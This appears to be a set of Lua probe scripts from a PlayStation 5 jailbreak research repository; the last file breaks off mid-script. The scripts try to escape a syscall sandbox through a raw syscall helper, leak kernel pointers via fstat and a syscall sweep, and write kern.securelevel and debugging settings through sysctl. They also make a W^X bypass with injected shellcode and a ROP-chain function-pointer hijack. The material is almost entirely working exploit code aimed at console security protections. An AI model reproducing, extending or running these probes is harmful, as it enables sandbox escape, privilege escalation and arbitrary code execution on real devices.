## probes/phase10_untested_theories/43e_blocked_syscall_bypass.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 43e: Re-test "blocked" syscalls via make_syscall
--
-- The sandbox filter is in syscall.resolve(), NOT the kernel.
-- Proven by sysctl(202) working via make_syscall while resolve()
-- reports it blocked. This probe tests every important "blocked"
-- syscall through the raw make_syscall path.
--
-- If thr_new(455) works: entire race condition bug class opens up.
-- If ioctl(54) works: massive kernel attack surface.
-- If dup/dup2 work: fd manipulation primitives.

print("=== PROBE 43e: BLOCKED SYSCALL BYPASS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local results = {}
local function record(name, num, rv, note)
    results[#results + 1] = {name=name, num=num, rv=rv, note=note}
    print(string.format("  %-20s (%3d): ret=%-6d %s", name, num, rv, note or ""))
end

--------------------------------------------------------------------
-- A) dup / dup2 — fd manipulation
--------------------------------------------------------------------
print("")
print("=== A: DUP/DUP2 ===")
do
    -- dup(41) with fd 0 (stdin-ish, whatever the loader gives us)
    local sc_dup = make_syscall(41)
    local ok, ret = pcall(function() return sc_dup(uint64(0)) end)
    local rv = ok and to_num(ret) or -999
    record("dup", 41, rv, rv >= 0 and "NEW FD=" .. rv or "")

    -- dup2(90) — dup fd 0 to fd 100
    local sc_dup2 = make_syscall(90)
    ok, ret = pcall(function() return sc_dup2(uint64(0), uint64(100)) end)
    rv = ok and to_num(ret) or -999
    record("dup2", 90, rv)
end

--------------------------------------------------------------------
-- B) fstat(189) — kernel pointer leak from stat buffer
--------------------------------------------------------------------
print("")
print("=== B: FSTAT ===")
do
    local sc_fstat = make_syscall(189)
    local stat_buf = memory.alloc(0x100)
    for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end

    -- fstat on various fds
    local fds = {0, 3, 4, 5}  -- 0=stdin?, 3-5=likely sockets
    for _, fd in ipairs(fds) do
        for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
        local ok, ret = pcall(function()
            return sc_fstat(uint64(fd), uint64(stat_buf))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  fstat(%d): ret=%d", fd, rv))

        if rv == 0 then
            -- struct stat layout (FreeBSD amd64):
            -- +0x00: st_dev (8)
            -- +0x08: st_ino (8) *** may contain kernel address for sockets
            -- +0x10: st_mode (4)
            -- +0x18: st_nlink (8)
            -- +0x30: st_size (8)
            for off = 0, 0x70, 8 do
                local q = safe_rq(stat_buf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h ~= 0 or l ~= 0 then
                        local tag = ""
                        if h >= 0xFFFF8000 then tag = " *** KPTR ***" end
                        print(string.format("    +%02X: %08X_%08X%s", off, h, l, tag))
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- C) ioctl(54) — device control
--------------------------------------------------------------------
print("")
print("=== C: IOCTL ===")
do
    local sc_ioctl = make_syscall(54)
    -- Try FIONREAD (0x4004667F) on a socket fd
    local buf = memory.alloc(16)
    safe_wd(buf, 0)

    local ok, ret = pcall(function()
        return sc_ioctl(uint64(3), uint64(0x4004667F), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rd(buf) or -1
    record("ioctl FIONREAD", 54, rv, "val=" .. val)

    -- Try TIOCGETA (0x402C7413) — terminal attributes
    for off = 0, 12, 4 do safe_wd(buf + off, 0) end
    ok, ret = pcall(function()
        return sc_ioctl(uint64(0), uint64(0x402C7413), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("ioctl TIOCGETA", 54, rv)

    -- Try SIOCGIFADDR on a socket — get interface address
    ok, ret = pcall(function()
        return sc_ioctl(uint64(3), uint64(0xC0206921), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("ioctl SIOCGIFADDR", 54, rv)
end

--------------------------------------------------------------------
-- D) thr_new(455) — THE BIG ONE
--------------------------------------------------------------------
print("")
print("=== D: THR_NEW ===")
do
    local sc_thr_new = make_syscall(455)

    -- struct thr_param for thr_new
    -- We need a valid stack and entry point
    -- Allocate a stack
    local stack_size = 0x10000
    local sc_mmap = make_syscall(477)
    local stack
    pcall(function()
        stack = sc_mmap(uint64(0), uint64(stack_size), uint64(3), -- RW
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if stack then
        local stack_h, stack_l = get_hi_lo(stack)
        print("  stack allocated: " .. string.format("%08X_%08X", stack_h, stack_l))

        -- struct thr_param (FreeBSD):
        -- void (*start_func)(void*) +0x00
        -- void *arg                +0x08
        -- char *stack_base         +0x10
        -- size_t stack_size        +0x18
        -- char *tls_base           +0x20
        -- size_t tls_size          +0x28
        -- long *child_tid          +0x30
        -- long *parent_tid         +0x38
        -- int flags                +0x40
        -- struct rtprio *rtp       +0x48
        local param = memory.alloc(0x60)
        for off = 0, 0x5C, 4 do safe_wd(param + off, 0) end

        -- For start_func, use a simple ret gadget from eboot
        -- We don't actually want the thread to run — just see if
        -- thr_new returns success
        local sc_dynlib_get_info = make_syscall(593)
        local info = memory.alloc(0x200)
        safe_wd(info, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(0), info) end)
        local eb_tl = safe_rd(info + 0x108) or 0
        local eb_th = safe_rd(info + 0x10C) or 0
        -- ret gadget at eboot+0x42
        local ret_gadget = uint64(string.format("0x%X%08X", eb_th, eb_tl + 0x42))

        safe_wq(param, ret_gadget)       -- start_func = ret
        safe_wq(param + 0x08, uint64(0)) -- arg = NULL
        safe_wq(param + 0x10, stack)     -- stack_base
        safe_wq(param + 0x18, uint64(stack_size)) -- stack_size

        local tid_buf = memory.alloc(8)
        safe_wq(tid_buf, uint64(0))
        safe_wq(param + 0x30, uint64(tid_buf)) -- child_tid

        local ok, ret = pcall(function()
            return sc_thr_new(uint64(param), uint64(0x50))
        end)
        local rv = ok and to_num(ret) or -999
        local child_tid = safe_rq(tid_buf)
        local th, tl = 0, 0
        if child_tid then th, tl = get_hi_lo(child_tid) end

        print(string.format("  thr_new: ret=%d child_tid=%08X_%08X", rv, th, tl))
        if rv == 0 then
            print("  *** THREADING WORKS VIA MAKE_SYSCALL ***")
            print("  Race conditions are now possible!")
        end

        record("thr_new", 455, rv, rv == 0 and "THREAD CREATED" or "")
    else
        print("  could not allocate stack")
        record("thr_new", 455, -1, "no stack")
    end
end

--------------------------------------------------------------------
-- E) pipe2(542) — different number than pipe(42)
--------------------------------------------------------------------
print("")
print("=== E: PIPE2 ===")
do
    local sc_pipe2 = make_syscall(542)
    local fds = memory.alloc(16)
    safe_wd(fds, 0)
    safe_wd(fds + 4, 0)

    -- pipe2(fds, 0) — flags=0 means same as pipe()
    local ok, ret = pcall(function()
        return sc_pipe2(uint64(fds), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local fd0 = safe_rd(fds) or -1
    local fd1 = safe_rd(fds + 4) or -1
    record("pipe2", 542, rv, "fds=" .. fd0 .. "," .. fd1)
end

--------------------------------------------------------------------
-- F) procctl(544) — process control
--------------------------------------------------------------------
print("")
print("=== F: PROCCTL ===")
do
    local sc_procctl = make_syscall(544)
    local buf = memory.alloc(16)

    -- PROC_ASLR_STATUS (13) — get ASLR mode
    safe_wd(buf, 0)
    local ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(13), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rd(buf) or -1
    record("procctl ASLR_STATUS", 544, rv, "val=" .. val)

    -- PROC_ASLR_CTL (12) — try to disable ASLR
    -- PROC_ASLR_FORCE_DISABLE = 1
    safe_wd(buf, 1)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(12), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl ASLR_CTL(disable)", 544, rv)

    -- PROC_TRACE_CTL (7) — control tracing
    safe_wd(buf, 0)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(7), uint64(buf))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl TRACE_CTL", 544, rv)

    -- PROC_REAP_ACQUIRE (2)
    ok, ret = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(2), uint64(0))
    end)
    rv = ok and to_num(ret) or -999
    record("procctl REAP_ACQUIRE", 544, rv)
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== BYPASS SUMMARY ===")
local worked = 0
for _, r in ipairs(results) do
    if r.rv >= 0 and r.rv ~= 0xFFFFFFFF then
        print(string.format("  WORKS: %-20s (%3d) ret=%d %s", r.name, r.num, r.rv, r.note or ""))
        worked = worked + 1
    end
end
print("syscalls unblocked via make_syscall: " .. worked)

print("")
print("=== PROBE 43e COMPLETE ===")
```

## probes/phase10_untested_theories/43f_sysctl_write.lua

```lua
-- CRASH_CLASS: HIGH (writing kernel state)
-- PROBE 43f: Sysctl WRITE paths — kern.securelevel, coredump, etc.
--
-- All previous sysctl testing was READ-only. The __sysctl syscall
-- also accepts newp/newlen for writes. If we can write:
--   kern.securelevel = -1 → enables kldload, raw disk, etc.
--   kern.coredump = 1 + kern.corefile = path → crash writes memory
--   security.bsd.unprivileged_proc_debug = 1 → enables ptrace

print("=== PROBE 43f: SYSCTL WRITE PATHS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

-- Helper: read a sysctl int value
local function sysctl_read_int(mib_vals)
    local mib = memory.alloc(#mib_vals * 4)
    for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
    local out = memory.alloc(8)
    safe_wd(out, 0)
    local lenp = memory.alloc(8)
    safe_wd(lenp, 4)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(#mib_vals),
            uint64(out), uint64(lenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    return rv, safe_rd(out)
end

-- Helper: write a sysctl int value
local function sysctl_write_int(mib_vals, new_val)
    local mib = memory.alloc(#mib_vals * 4)
    for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
    -- Read current value first (oldp)
    local out = memory.alloc(8)
    safe_wd(out, 0)
    local lenp = memory.alloc(8)
    safe_wd(lenp, 4)
    -- New value buffer
    local newp = memory.alloc(8)
    safe_wd(newp, new_val)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(#mib_vals),
            uint64(out), uint64(lenp), uint64(newp), uint64(4))
    end)
    local rv = ok and to_num(ret) or -999
    return rv, safe_rd(out)
end

--------------------------------------------------------------------
-- A) Read current securelevel
--------------------------------------------------------------------
print("")
print("=== A: KERN.SECURELEVEL READ ===")
do
    -- kern.securelevel = {1, 33} on FreeBSD
    local rv, val = sysctl_read_int({1, 33})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))
end

--------------------------------------------------------------------
-- B) Try to WRITE securelevel = -1
--------------------------------------------------------------------
print("")
print("=== B: KERN.SECURELEVEL WRITE ===")
do
    -- Write -1 (0xFFFFFFFF as unsigned)
    local rv, old = sysctl_write_int({1, 33}, 0xFFFFFFFF)
    print(string.format("  write(-1): ret=%d old_val=%d", rv, old or -1))

    -- Verify
    if rv == 0 then
        local rv2, val = sysctl_read_int({1, 33})
        print(string.format("  verify: ret=%d val=%d", rv2, val or -1))
        if val and val ~= 1024 then
            print("  *** SECURELEVEL CHANGED ***")
        end
    end
end

--------------------------------------------------------------------
-- C) kern.coredump — enable core dumps
--------------------------------------------------------------------
print("")
print("=== C: KERN.COREDUMP ===")
do
    -- kern.coredump = {1, 27}
    local rv, val = sysctl_read_int({1, 27})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 and val == 0 then
        -- Try enabling
        local rv2, old = sysctl_write_int({1, 27}, 1)
        print(string.format("  write(1): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- D) security.bsd.unprivileged_proc_debug
--------------------------------------------------------------------
print("")
print("=== D: SECURITY.BSD.UNPRIVILEGED_PROC_DEBUG ===")
do
    -- security.bsd = {14, 2}, unprivileged_proc_debug likely at {14, 2, X}
    -- On FreeBSD: security.bsd.unprivileged_proc_debug = sysctl {14, 2, 2}
    local rv, val = sysctl_read_int({14, 2, 2})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 then
        local rv2, old = sysctl_write_int({14, 2, 2}, 1)
        print(string.format("  write(1): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- E) kern.maxproc — resource limits
--------------------------------------------------------------------
print("")
print("=== E: KERN.MAXPROC WRITE ===")
do
    local rv, val = sysctl_read_int({1, 6})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 then
        local rv2, old = sysctl_write_int({1, 6}, 10000)
        print(string.format("  write(10000): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- F) debug.kdb.enter — kernel debugger (will hang if it works!)
-- Only test if other writes succeeded
--------------------------------------------------------------------
print("")
print("=== F: MISC READS ===")
do
    -- kern.maxfiles {1, 7}
    local rv, val = sysctl_read_int({1, 7})
    print(string.format("  kern.maxfiles: ret=%d val=%d", rv, val or -1))

    -- kern.somaxconn {1, 35}
    rv, val = sysctl_read_int({1, 35})
    print(string.format("  kern.somaxconn: ret=%d val=%d", rv, val or -1))

    -- net.inet.tcp.mssdflt {4, 2, 6, 16}
    rv, val = sysctl_read_int({4, 2, 6, 16})
    print(string.format("  tcp.mssdflt: ret=%d val=%d", rv, val or -1))
end

print("")
print("=== PROBE 43f COMPLETE ===")
```

## probes/phase10_untested_theories/43g_sony_syscall_sweep.lua

```lua
-- CRASH_CLASS: MODERATE (probing unknown syscalls with safe args)
-- PROBE 43g: Systematic Sony syscall sweep 540–650
--
-- Calls each syscall number with arg=0 to find which ones are live.
-- Any that return 0 or positive are alive and need deeper probing.
-- Focus on syscalls that return data (potential kernel leaks).

print("=== PROBE 43g: SONY SYSCALL SWEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

-- Already known syscalls (skip them)
local known = {
    [538]=true, [539]=true, -- evf_create/delete
    [547]=true, [548]=true, [549]=true, [550]=true, [551]=true, [552]=true, -- dmem
    [585]=true, -- mtypeprotect (tested in 42f)
    [588]=true, -- munmap
    [592]=true, [593]=true, -- dynlib
    [594]=true, -- dlsym
    [617]=true, -- getCpuUsage (tested in 42f)
}

--------------------------------------------------------------------
-- SWEEP: call each unknown syscall with (0) and (out_buf)
--------------------------------------------------------------------
print("")
print("=== SWEEP 540-650 ===")

local out_buf = memory.alloc(0x200)
local live = {}

for num = 540, 650 do
    if not known[num] then
        -- Zero output buffer
        for off = 0, 0x1FC, 4 do safe_wd(out_buf + off, 0) end

        local sc = make_syscall(num)

        -- Try with output buffer as first arg
        local ok, ret = pcall(function()
            return sc(uint64(out_buf))
        end)
        local rv = ok and to_num(ret) or -999

        -- Check for interesting returns
        if rv ~= -999 and rv ~= -1 and rv ~= 0xFFFFFFFF then
            live[#live + 1] = {num = num, rv = rv}
            -- Check output buffer
            local q = safe_rq(out_buf)
            local qh, ql = 0, 0
            if q then qh, ql = get_hi_lo(q) end
            local tag = ""
            if qh >= 0xFFFF8000 then tag = " KPTR!" end
            print(string.format("  %3d: ret=%-6d buf=%08X_%08X%s", num, rv, qh, ql, tag))
        end

        -- Also try with just 0 as arg (some take an int, not a pointer)
        for off = 0, 0x1FC, 4 do safe_wd(out_buf + off, 0) end
        local ok2, ret2 = pcall(function()
            return sc(uint64(0))
        end)
        local rv2 = ok2 and to_num(ret2) or -999

        if rv2 ~= rv and rv2 ~= -999 and rv2 ~= -1 and rv2 ~= 0xFFFFFFFF then
            live[#live + 1] = {num = num, rv = rv2, note = "(arg=0)"}
            print(string.format("  %3d: ret=%-6d (arg=0)", num, rv2))
        end
    end
end

--------------------------------------------------------------------
-- Also sweep 650-700 (possible newer PS5 additions)
--------------------------------------------------------------------
print("")
print("=== SWEEP 650-700 ===")
for num = 650, 700 do
    for off = 0, 0x1FC, 4 do safe_wd(out_buf + off, 0) end
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(uint64(out_buf))
    end)
    local rv = ok and to_num(ret) or -999
    if rv ~= -999 and rv ~= -1 and rv ~= 0xFFFFFFFF then
        live[#live + 1] = {num = num, rv = rv}
        local q = safe_rq(out_buf)
        local qh, ql = 0, 0
        if q then qh, ql = get_hi_lo(q) end
        print(string.format("  %3d: ret=%-6d buf=%08X_%08X", num, rv, qh, ql))
    end
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== LIVE SYSCALLS ===")
for _, s in ipairs(live) do
    print(string.format("  syscall %d: ret=%d %s", s.num, s.rv, s.note or ""))
end
print("total live: " .. #live)

print("")
print("=== PROBE 43g COMPLETE ===")
```

## probes/phase10_untested_theories/43h_mtypeprotect_wxbypass.lua

```lua
-- CRASH_CLASS: HIGH (changing memory protections, may crash)
-- PROBE 43h: sceKernelMtypeprotect (585) — W^X bypass attempt
--
-- Probe 42f showed syscall 585 returns success (ret=1).
-- This is Sony's custom memory protection syscall.
-- If it can make RW pages executable, W^X is dead.
--
-- Strategy:
--   1. Allocate RW page via mmap
--   2. Write known machine code (e.g., "mov eax, 0x41414141; ret")
--   3. Call mtypeprotect to change to RX
--   4. Attempt to execute the page via ROP chain fn_addr redirect
--
-- If execution succeeds: arbitrary native code execution, no ROP needed.

print("=== PROBE 43h: MTYPEPROTECT W^X BYPASS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mprotect = make_syscall(74)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Allocate RW page
--------------------------------------------------------------------
print("")
print("=== A: ALLOCATE RW PAGE ===")
local page_size = 0x4000  -- 16KB PS5 page
local rw_page
pcall(function()
    rw_page = sc_mmap(uint64(0), uint64(page_size), uint64(3), -- PROT_READ|PROT_WRITE
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) -- MAP_ANON|MAP_PRIVATE
end)
if not rw_page then print("MMAP FAILED"); return end
print("RW page at: " .. qw_hex(rw_page))

-- Write shellcode: mov eax, 0x41414141; ret
-- B8 41 41 41 41 C3
safe_wd(rw_page, 0x414141B8)     -- mov eax, 0x41414141 (first 4 bytes)
safe_wd(rw_page + 4, 0x000000C3) -- ret + padding (41 from prev + C3)
-- Actually let's be precise:
-- Byte 0: B8, Byte 1-4: 41414141, Byte 5: C3
memory.write_byte(rw_page, 0xB8)       -- mov eax, imm32
memory.write_byte(rw_page + 1, 0x41)
memory.write_byte(rw_page + 2, 0x41)
memory.write_byte(rw_page + 3, 0x41)
memory.write_byte(rw_page + 4, 0x41)
memory.write_byte(rw_page + 5, 0xC3)   -- ret

-- Verify written
local b0 = safe_rd(rw_page) or 0
print(string.format("  shellcode: %08X", b0))

--------------------------------------------------------------------
-- B) Try mtypeprotect with various protection flags
--------------------------------------------------------------------
print("")
print("=== B: MTYPEPROTECT CALLS ===")
do
    -- Try different protection values
    -- PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    local prots = {
        {val = 5, name = "RX (READ|EXEC)"},
        {val = 7, name = "RWX (READ|WRITE|EXEC)"},
        {val = 4, name = "X (EXEC only)"},
    }

    for _, p in ipairs(prots) do
        -- mtypeprotect signature is unknown — try common patterns:
        -- mtypeprotect(addr, len, prot)
        -- mtypeprotect(addr, len, old_type, new_type)

        -- Pattern 1: (addr, len, prot)
        local ok, ret = pcall(function()
            return sc_mtypeprotect(uint64(rw_page), uint64(page_size), uint64(p.val))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  mtypeprotect(%s, 3-arg): ret=%d", p.name, rv))

        -- Pattern 2: (addr, len, old_prot, new_prot)
        ok, ret = pcall(function()
            return sc_mtypeprotect(uint64(rw_page), uint64(page_size),
                uint64(3), uint64(p.val))
        end)
        rv = ok and to_num(ret) or -999
        print(string.format("  mtypeprotect(%s, 4-arg): ret=%d", p.name, rv))
    end

    -- Also try standard mprotect for comparison
    local ok, ret = pcall(function()
        return sc_mprotect(uint64(rw_page), uint64(page_size), uint64(5))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  mprotect(RX): ret=%d (expected -1)", rv))
end

--------------------------------------------------------------------
-- C) Check if page protection actually changed
-- Try reading the page (should still work if RX or RWX)
--------------------------------------------------------------------
print("")
print("=== C: VERIFY PAGE STATE ===")
do
    local val = safe_rd(rw_page)
    print(string.format("  read after mtypeprotect: %s", val and string.format("%08X", val) or "SEGFAULT"))

    -- Try writing (should fail if changed to RX)
    local write_ok = safe_wd(rw_page + 0x100, 0xDEADBEEF)
    print(string.format("  write after mtypeprotect: %s", write_ok and "OK (still writable)" or "FAILED (now RX?)"))

    local wrote = safe_rd(rw_page + 0x100)
    print(string.format("  verify write: %s", wrote and string.format("%08X", wrote) or "unreadable"))
end

--------------------------------------------------------------------
-- D) If mtypeprotect seemed to work, try executing via ROP redirect
-- (Only if we're confident the page is executable)
--------------------------------------------------------------------
print("")
print("=== D: EXECUTION TEST (via ROP fn_addr redirect) ===")
do
    -- Get fn_addr pointer
    local pipe_str = tostring(syscall.pipe)
    local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

    if fn_str then
        local fn_ptr = uint64(fn_str)

        -- Allocate GPU to reach fn_addr
        local gpu_size = 512 * 0x4000
        local gpu_addr
        pcall(function()
            gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

        if gpu_addr then
            local fn_orig = safe_rq(fn_ptr)
            if fn_orig then
                print("  fn_addr original: " .. qw_hex(fn_orig))
                print("  shellcode page: " .. qw_hex(rw_page))
                print("")
                print("  NOTE: Not executing automatically.")
                print("  To test: overwrite fn_addr with shellcode page address,")
                print("  then call any syscall. If mtypeprotect worked,")
                print("  the shellcode runs. If not, it crashes.")
                print("")
                print("  Set EXECUTE_TEST=true in probe to attempt.")

                local EXECUTE_TEST = false
                if EXECUTE_TEST then
                    print("  ATTEMPTING EXECUTION...")
                    safe_wq(fn_ptr, rw_page)
                    local ok, ret = pcall(function()
                        return sc_getpid()
                    end)
                    local rv = ok and to_num(ret) or -999
                    print(string.format("  result: ok=%s ret=%d", tostring(ok), rv))
                    if ok and rv == 0x41414141 then
                        print("  *** NATIVE CODE EXECUTION ACHIEVED ***")
                    end
                    -- Restore
                    safe_wq(fn_ptr, fn_orig)
                end
            end
            pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
        end
    else
        print("  could not parse fn_addr")
    end
end

-- Cleanup
pcall(function() sc_munmap(rw_page, uint64(page_size)) end)

print("")
print("=== PROBE 43h COMPLETE ===")
```

## probes/phase10_untested_theories/43i_fn_redirect.lua

```lua
-- CRASH_CLASS: HIGH (ropchain fn_addr modification — WILL CRASH if wrong)
-- PROBE 43i: attempt fn_addr redirect to learn chain rebuild behavior
--
-- From 42i: slot 0 (heap addr) loads the value that becomes fn_addr.
-- Key question: does the Lua layer rebuild the ENTIRE chain per call,
-- or does it only update the syscall number and args?
--
-- Test 1: Write to fn_addr directly, call getpid, check if our write survived
-- Test 2: Write to slot 0 (the source), call getpid, check
-- Test 3: Observe what the chain looks like after DIFFERENT syscalls
--          to understand what's rebuilt vs. constant

print("=== PROBE 43i: FN_ADDR REDIRECT TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_getpid = make_syscall(20)
local sc_pipe = make_syscall(42)
local sc_dynlib_get_info = make_syscall(593)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

-- Get ropchain addresses
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if not rop_str or not fn_str then
    print("cannot parse")
    return
end

local rop_base = uint64(rop_str)
local fn_addr = uint64(fn_str)

print("ropchain: " .. rop_str)
print("fn_addr ptr: " .. fn_str)

-- GPU mmap
local gpu
pcall(function()
    gpu = sc_mmap(uint64(0), uint64(512 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFF"), uint64(0))
end)
if not gpu then print("GPU FAILED"); return end

-- Verify accessibility
local fn_orig = safe_rq(fn_addr)
if not fn_orig then print("fn_addr not readable"); return end
print("fn_addr original: " .. qw_hex(fn_orig))
print("")

--------------------------------------------------------------------
-- TEST 1: What does the chain look like after getpid vs after pipe?
-- Compare key positions to see what changes between calls.
--------------------------------------------------------------------
print("--- TEST 1: CHAIN AFTER GETPID ---")

pcall(function() sc_getpid() end)

-- Record chain state
local state_getpid = {}
for off = 0, 0x2F8, 8 do
    state_getpid[off] = safe_rq(rop_base + off)
end

-- Record fn_addr
local fn_after_getpid = safe_rq(fn_addr)
print("fn_addr after getpid: " .. qw_hex(fn_after_getpid))

-- Also record what slot 0 points to
-- Slot 0 is at chain+0x010 (from 42i: the first H:near_chain)
local slot0_addr = safe_rq(rop_base + 0x010)
if slot0_addr then
    local slot0_val = safe_rq(slot0_addr)
    print("slot0 addr: " .. qw_hex(slot0_addr))
    print("slot0 val (-> fn_addr): " .. (slot0_val and qw_hex(slot0_val) or "nil"))
